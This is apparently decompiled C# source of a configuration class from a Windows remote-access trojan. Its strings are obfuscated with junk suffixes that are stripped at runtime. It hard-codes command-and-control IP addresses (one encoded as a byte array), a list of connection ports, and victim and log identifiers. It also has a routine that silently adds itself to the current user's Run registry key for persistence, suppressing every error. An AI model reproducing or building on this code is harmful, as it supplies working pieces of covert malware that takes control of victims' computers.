using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace roigtbraorn;

internal static class COAINF
{
	public static byte[] roigtbraornvpsips = new byte[13]
	{
		49, 55, 50, 46, 50, 52, 53, 46, 56, 55,
		46, 49, 50
	};

	public static string filePath = Application.get_ExecutablePath();

	public static string roigtbraorndefaultP = "125.200.101.121|roigtbraorn".Split(new char[1] { '|' })[0];

	public static string roigtbraornmainApp = "rigtbraorn|roigtbraorn".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 6276, 4586, 8443, 12447, 18856 };

	public static int roigtbraornport;

	public static string roigtbraornpc_id = "drsia|roigtbraorn".Split(new char[1] { '|' })[0];

	public static string roigtbraornremvUser = "rilathrcin|roigtbraorn".Split(new char[1] { '|' })[0];

	public static string roigtbraornfilesLogs = "dhithbis".Split(new char[1] { '|' })[0];

	public static byte[] getByteArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string getBytsString(byte[] data)
	{
		char[] array = new char[data.Length];
		for (int i = 0; i < data.Length; i++)
		{
			char c = (array[i] = Convert.ToChar(data[i]));
		}
		return new string(array);
	}

	public static string roigtbraornget_mpath()
	{
		return Path.GetDirectoryName(filePath) + "\\";
	}

	public static void roigtbraornset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|roigtbraorn".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			object value = registryKey.GetValue(roigtbraornpc_id + app);
			if (value == null || value.ToString() != path)
			{
				registryKey.SetValue(roigtbraornpc_id + app, path);
			}
		}
		catch
		{
		}
	}

	public static string roigtbraornOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!roigtbraorn".Split(new char[1] { '!' })[0];
		}
	}
}
